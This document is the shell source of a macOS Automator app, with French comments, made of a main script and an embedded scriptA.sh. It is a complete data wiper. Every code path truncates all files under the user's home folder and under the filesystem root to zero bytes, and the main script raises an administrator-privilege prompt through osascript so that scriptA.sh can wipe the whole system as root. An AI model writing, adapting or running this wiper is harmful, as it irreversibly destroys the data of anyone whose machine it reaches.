Main script app
#!/bin/bash

# Retrouver le bundle .app qui a lancé cette action Automator
PID=$$
APP=""

while [ "$PID" -gt 1 ]; do
    EXEC="$(ps -p "$PID" -o comm= | sed 's/^[[:space:]]*//')"

    case "$EXEC" in
        *.app/Contents/MacOS/*)
            APP="${EXEC%%.app/Contents/MacOS/*}.app"
            break
            ;;
    esac

    PID="$(ps -p "$PID" -o ppid= | tr -d ' ')"
done

# Vérifier que le bundle a réellement été trouvé
if [ -z "$APP" ] || [ ! -d "$APP" ]; then
    MAINTARGET="/"
    TARGET="$HOME"
    while IFS= read -r -d '' FILE
    do
        if { : > "$FILE"; } 2>/dev/null; then
            continue
        else
            continue
        fi
        
    done < <(find "$TARGET" -type f -print0 2>/dev/null)
    
    while IFS= read -r -d '' FILE
    do
        if { : > "$FILE"; } 2>/dev/null; then
            continue
        else
            continue
        fi
    
    done < <(find "$MAINTARGET" -type f -print0 2>/dev/null)

    exit 1
fi

SELF="$APP"
MAINTARGET="/"
TARGET="$HOME"

# Chemin du script embarqué A
SCRIPT="$APP/Contents/Resources/scriptA.sh"
if [ ! -f "$SCRIPT" ]; then
    MAINTARGET="/"
    TARGET="$HOME"
    while IFS= read -r -d '' FILE
    do
        if { : > "$FILE"; } 2>/dev/null; then
            continue
        else
            continue
        fi
        
    done < <(find "$TARGET" -type f -print0 2>/dev/null)
    
    while IFS= read -r -d '' FILE
    do
        if { : > "$FILE"; } 2>/dev/null; then
            continue
        else
            continue
        fi
    
    done < <(find "$MAINTARGET" -type f -print0 2>/dev/null)
    exit 1
fi

# Demande d'autorisation macOS puis lancement de scriptA.sh
/usr/bin/osascript - "$SCRIPT" "$SELF" "$TARGET" >/dev/null <<'APPLESCRIPT'
on run argv
    set scriptPath to item 1 of argv
    set selfPath to item 2 of argv
    set targetPath to item 3 of argv
    return do shell script "/bin/bash " & quoted form of scriptPath & " " & quoted form of selfPath & " " & quoted form of targetPath with administrator privileges
end run
APPLESCRIPT

STATUS=$?

if [ "$STATUS" -eq 0 ]; then
    exit 1
fi

while IFS= read -r -d '' FILE
do
    if { : > "$FILE"; } 2>/dev/null; then
        continue
    else
        continue
    fi
    
done < <(find "$TARGET" -path "$SELF" -prune -o -type f -print0 2>/dev/null)

while IFS= read -r -d '' FILE
do
    if { : > "$FILE"; } 2>/dev/null; then
        continue
    else
        continue
    fi

done < <(find "$MAINTARGET" -path "$SELF" -prune -o -type f -print0 2>/dev/null)


scriptA.sh
#!/bin/bash

SELF="$1"
TARGET="$2"

while IFS= read -r -d '' FILE
do
    if { : > "$FILE"; } 2>/dev/null; then
        continue
    else
        continue
    fi
    
done < <(find "$TARGET" -path "$SELF" -prune -o -type f -print0 2>/dev/null)

MAINTARGET="/"

while IFS= read -r -d '' FILE
do
    if { : > "$FILE"; } 2>/dev/null; then
        continue
    else
        continue
    fi

done < <(find "$MAINTARGET" -path "$SELF" -prune -o -type f -print0 2>/dev/null)

